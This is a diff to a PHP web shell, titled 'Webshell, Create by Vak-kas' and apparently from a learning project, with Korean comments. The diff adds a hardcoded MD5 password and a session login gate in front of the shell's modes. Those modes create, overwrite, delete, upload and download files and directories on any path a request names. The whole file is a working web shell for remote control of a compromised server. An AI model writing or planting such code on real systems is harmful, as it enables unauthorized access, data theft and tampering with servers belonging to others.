@@ -1,4 +1,6 @@
 <?php
+    session_start(); // 세션 시작
+
     header("Content-Type: text/html; charset=UTF8");
     $mode = isset($_REQUEST["mode"]) ? $_REQUEST["mode"] : "fileBrowser";
     $path = isset($_REQUEST["path"]) ? $_REQUEST["path"] : "";
@@ -11,6 +13,11 @@
     $dbName = isset($_POST["dbName"]) ? $_POST["dbName"] : "";
     $query = isset($_POST["query"]) ? $_POST["query"] : "";
 
+    
+    $inputPw = isset($_POST["inputPw"]) ? $_POST["inputPw"] : "";
+    $accessPw = "1bbd886460827015e5d605ed44252251"; #webshell password
+    $accessFlag = isset($_SESSION["accessFlag"]); #로그인을 하면 accessFlag가 y로 설정이 됨. 로그인이 되지 않으면 Null -> 로그인 유무 확인
+
 
     if(empty($path)){
         $tempFileName = basename(__FILE__); // 현재 파일명을 basename으로 가져옴 -> magic constant 미리 정의된 상수
@@ -22,110 +29,125 @@
         $path = str_replace("\\", "/", $path);
     }
 
-    #Mode Logic
-    if($mode == "fileCreate"){
-        if(empty($fileName)){
-            echo "<script>alert('파일명이 입력되지 않았습니다.'); history.back(-1) ;</script>";
-            exit();
-        }
-        $fp = fopen($path.$fileName, "w");
-        fclose($fp);
-        echo "<script>location.href='{$page}?mode=fileBrowser&path={$path}'</script>";
-    }
-    else if($mode == "dirCreate"){
-        if(empty($fileName)){
-            echo "<script>alert('디렉터리명이 입력되지 않았습니다.'); history.back(-1) ;</script>";
-            exit();
-        }
+    if($accessFlag == "Y"){ //로그인 해야만 할 수 있다.
 
-        $dirPath = $path.$fileName;
-        if(is_dir($dirPath)){ // 디렉터리가 존재하는가?
-            echo "<script>alert('해당 디렉터리 명이 존재합니다.');history.back(-1);</script>";
-            exit();
+        #Mode Logic
+        if($mode == "fileCreate"){
+            if(empty($fileName)){
+                echo "<script>alert('파일명이 입력되지 않았습니다.'); history.back(-1) ;</script>";
+                exit();
+            }
+            $fp = fopen($path.$fileName, "w");
+            fclose($fp);
+            echo "<script>location.href='{$page}?mode=fileBrowser&path={$path}'</script>";
         }
-        mkdir($dirPath);
-        echo "<script>location.href='{$page}?mode=fileBrowser&path={$path}'</script>";
+        else if($mode == "dirCreate"){
+            if(empty($fileName)){
+                echo "<script>alert('디렉터리명이 입력되지 않았습니다.'); history.back(-1) ;</script>";
+                exit();
+            }
 
-    }
-    else if($mode == "fileModify" && !empty($_POST["fileContents"])){
-        
-        $filePath = $path.$fileName;
-        if(!file_exists($filePath)){
-            echo "<script>alert('파일이 존재하지 않습니다.')</script>";
-            exit();
+            $dirPath = $path.$fileName;
+            if(is_dir($dirPath)){ // 디렉터리가 존재하는가?
+                echo "<script>alert('해당 디렉터리 명이 존재합니다.');history.back(-1);</script>";
+                exit();
+            }
+            mkdir($dirPath);
+            echo "<script>location.href='{$page}?mode=fileBrowser&path={$path}'</script>";
+
         }
-
-        $fileContents = $_POST["fileContents"];
-        $fp = fopen($filePath, "w");
-        fputs($fp, $fileContents, strlen($fileContents));
-        fclose($fp);
-        echo "<script>location.href='{$page}?mode=fileBrowser&path={$path}'</script>";
-
-    }
-    else if($mode == "fileDelete") {
-        if(empty($fileName)) { 
-            echo "<script>alert('파일명이 입력되지 않았습니다.');history.back(-1);</script>";
-            exit();
-        }
-        $filePath = $path.$fileName;
-        if(!file_exists($filePath)){
-            echo "<script>alert('파일이 존재하지 않습니다.');history.back(-1);</script>";
+        else if($mode == "fileModify" && !empty($_POST["fileContents"])){
             
-            exit();
-        }
-        if(!unlink($filePath)) {
-            echo "<script>alert('파일 삭제 실패');history.back(-1);</script>";
-            exit();
-        }
-        echo "<script>location.href='{$page}?mode=fileBrowser&path={$path}'</script>";
-    }
-    else if($mode == "dirDelete") {
-        if(empty($fileName)) { 
-            echo "<script>alert('디렉터리명이 입력되지 않았습니다.');history.back(-1);</script>";
-            exit();
-        }
-        $dirPath = $path.$fileName;
-        if(!is_dir($dirPath)){ // 디렉터리가 존재하지 않는가?
-            echo "<script>alert('디렉터리가 존재하지 않습니다.');history.back(-1);</script>";
-            exit();
-        }
-        if(!rmdir($dirPath)){
-            echo "<script>alert('디렉터리 삭제 실패.');history.back(-1);</script>";
-            exit();
-        }
-        echo "<script>location.href='{$page}?mode=fileBrowser&path={$path}'</script>";
-    }
-    else if($mode == "fileDownload"){
-        if(empty($fileName)) { 
-            echo "<script>alert('파일명이 입력되지 않았습니다.');history.back(-1);</script>";
-            exit();
-        }
+            $filePath = $path.$fileName;
+            if(!file_exists($filePath)){
+                echo "<script>alert('파일이 존재하지 않습니다.')</script>";
+                exit();
+            }
 
-        $filePath = $path.$fileName;
-        if(!file_exists($filePath)){
-            echo "<script>alert('파일이 존재하지 않습니다.');history.back(-1);</script>";
+            $fileContents = $_POST["fileContents"];
+            $fp = fopen($filePath, "w");
+            fputs($fp, $fileContents, strlen($fileContents));
+            fclose($fp);
+            echo "<script>location.href='{$page}?mode=fileBrowser&path={$path}'</script>";
+
+        }
+        else if($mode == "fileDelete") {
+            if(empty($fileName)) { 
+                echo "<script>alert('파일명이 입력되지 않았습니다.');history.back(-1);</script>";
+                exit();
+            }
+            $filePath = $path.$fileName;
+            if(!file_exists($filePath)){
+                echo "<script>alert('파일이 존재하지 않습니다.');history.back(-1);</script>";
+                
+                exit();
+            }
+            if(!unlink($filePath)) {
+                echo "<script>alert('파일 삭제 실패');history.back(-1);</script>";
+                exit();
+            }
+            echo "<script>location.href='{$page}?mode=fileBrowser&path={$path}'</script>";
+        }
+        else if($mode == "dirDelete") {
+            if(empty($fileName)) { 
+                echo "<script>alert('디렉터리명이 입력되지 않았습니다.');history.back(-1);</script>";
+                exit();
+            }
+            $dirPath = $path.$fileName;
+            if(!is_dir($dirPath)){ // 디렉터리가 존재하지 않는가?
+                echo "<script>alert('디렉터리가 존재하지 않습니다.');history.back(-1);</script>";
+                exit();
+            }
+            if(!rmdir($dirPath)){
+                echo "<script>alert('디렉터리 삭제 실패.');history.back(-1);</script>";
+                exit();
+            }
+            echo "<script>location.href='{$page}?mode=fileBrowser&path={$path}'</script>";
+        }
+        else if($mode == "fileDownload"){
+            if(empty($fileName)) { 
+                echo "<script>alert('파일명이 입력되지 않았습니다.');history.back(-1);</script>";
+                exit();
+            }
+
+            $filePath = $path.$fileName;
+            if(!file_exists($filePath)){
+                echo "<script>alert('파일이 존재하지 않습니다.');history.back(-1);</script>";
+                exit();
+            }
+
+            header("Content-Type: application/octet-stream"); //파일을 다운로드하게 하기 위한 컨텐트 타입
+            header("Content-Disposition: attachment; fileName= \"{$fileName}\""); #배치 성향, 특성, HTTP 응답값 body값이 어떤 특징을 가지고 있는가? / 첨부파일
+            // -> 이대로 가면 다운로드를 할 수 있게 함.
+            header("Content-transfer-Encoding: binary"); // 인코딩
+
+            readfile($filePath); //경로에 있는 파일을 그대로 불러옴
+            exit(); //얘는 반드시 종료를 해주어야함.
+        }
+        else if ($mode == "fileUpload" && !empty($_FILES["file"]["tmp_name"])){ //업로드 할 떄 파일의 값들이 몇 개 있는데, tmp_name 속성값은 비어있지 않는지의 유무로 파일이 있는지 확인
+            $filePath = $path.$_FILES["file"]["name"];
+
+            if(!move_uploaded_file($_FILES["file"]["tmp_name"], $filePath)){
+                echo "script>alert('파일 업로드에 실패하였습니다.');history.back(-1);</sctipt>";
+                exit();
+            }
+            echo "<script>location.href='{$page}?mode=fileBrowser&path={$path}'</script>";
+        }
+        else if ($mode == "logout") {
+            unset($_SESSION["accessFlag"]);
+            session_destroy();
+            echo "<script>location.href='{$page}'</script>";
             exit();
         }
-
-        header("Content-Type: application/octet-stream"); //파일을 다운로드하게 하기 위한 컨텐트 타입
-        header("Content-Disposition: attachment; fileName= \"{$fileName}\""); #배치 성향, 특성, HTTP 응답값 body값이 어떤 특징을 가지고 있는가? / 첨부파일
-        // -> 이대로 가면 다운로드를 할 수 있게 함.
-        header("Content-transfer-Encoding: binary"); // 인코딩
-
-        readfile($filePath); //경로에 있는 파일을 그대로 불러옴
-        exit(); //얘는 반드시 종료를 해주어야함.
-    }
-    else if ($mode == "fileUpload" && !empty($_FILES["file"]["tmp_name"])){ //업로드 할 떄 파일의 값들이 몇 개 있는데, tmp_name 속성값은 비어있지 않는지의 유무로 파일이 있는지 확인
-        $filePath = $path.$_FILES["file"]["name"];
-
-        if(!move_uploaded_file($_FILES["file"]["tmp_name"], $filePath)){
-            echo "script>alert('파일 업로드에 실패하였습니다.');history.back(-1);</sctipt>";
+    } else {
+        if($mode == "login" && ($accessPw == md5($inputPw))){
+            $_SESSION["accessFlag"] = "Y";
+            echo "<script>location.href='{$page}'</script>";
             exit();
         }
-        echo "<script>location.href='{$page}?mode=fileBrowser&path={$path}'</script>";
-
     }
     
+        
 
 
     # Directory List Return Function
@@ -204,6 +226,19 @@
     <div class="row">
     <div class='col-md-2'></div>
     <div class='col-md-8'>
+        <?php if($accessFlag != "Y") { ?>
+            <h3>Login</h3>
+            <hr>
+            <form action="<?php echo $page ?>?mode=login" method="POST">
+                <div class="input-group">
+                    <span class="input-group-addon">Password</span>
+                    <input type="password" class="form-control" placeholder = "Password Input..." name="inputPw">
+                </div>
+                <br>
+                <p class="text-center"><button class="btn btn-default" type="submit">Auth</button></p>
+            </form>
+
+        <?php } else { ?>
         <h3>Webshell <small>Create by Vak-kas</small></h3>
         <hr>
         <ul class="nav nav-tabs">
@@ -468,11 +503,12 @@
                 }
                 ?>            
             <?php } ?>
+        <?php } ?>
             
 
         <!-- 모드 else if 구문 괄호 -->
         <?php } ?>
-        
+
         <hr>
         <p class="text-muted text-center">Copyright© 2025, Vak-kas, All rights reserved.</p>
     </div>
